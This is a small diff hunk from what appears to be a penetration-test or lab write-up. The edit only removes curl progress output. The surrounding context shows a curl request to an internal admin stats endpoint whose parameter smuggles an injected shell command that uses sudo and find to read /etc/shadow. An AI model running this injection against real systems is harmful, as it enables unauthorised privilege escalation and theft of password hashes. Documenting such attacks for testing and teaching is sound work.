@@ -190,9 +190,7 @@ dr-xr-xr-x. 22 root root  63 Apr 19 16:42 ..
 curl -H "Authorization: Bearer ${CHEF_TOKEN}" \
 "http://192.168.1.2:8089/admin/stats/disk?parameters=%26%26sudo%20/usr/bin/find%20/tmp%20-type%20f%20-exec%20/bin/sh%20-c%20'cat%20/etc/shadow'%20\\;" | \
 jq -r '.output'
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100  2037  100  2037    0     0  60209      0 --:--:-- --:--:-- --:--:-- 61727
+
 Filesystem               Size  Used Avail Use% Mounted on
 fuse-overlayfs           149G  138G   12G  93% /
 /dev/mapper/fedora-root  149G  138G   12G  93% /app
